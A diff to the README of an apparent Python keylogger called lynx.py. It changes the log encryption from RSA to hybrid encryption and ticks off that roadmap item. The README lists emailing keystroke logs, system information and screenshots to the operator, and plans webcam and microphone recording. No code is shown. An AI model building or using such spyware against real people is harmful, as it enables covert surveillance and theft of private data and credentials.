@@ -32,7 +32,7 @@ _DISCLAIMER : This tool was made only for educational purposes. I strongly advis
 ## Features
 - Sends logs by email
 - Sends system information 
-- Logs are RSA encrypted before they're sent
+- Hybrid Encryption
 - Takes screenshots and sends them
 - Logs are sent every 60 seconds by default
 
@@ -67,7 +67,7 @@ python3 lynx.py
 Note: [decryptor.py](decryptor.py) will be decrypting your messages. Put your message in the [message.txt](message.txt) file or paste it as the value of "CIPHERTEXT", then run it; the plaintext will be printed to the screen.
 
 ## Roadmap
-- [ ] Replace RSA encryption with hybrid encryption 
+- [x] Replace RSA encryption with hybrid encryption 
 - [ ] Add Cross-platform support
 - [ ] Better keylogging
 - [ ] Record webcam and microphone
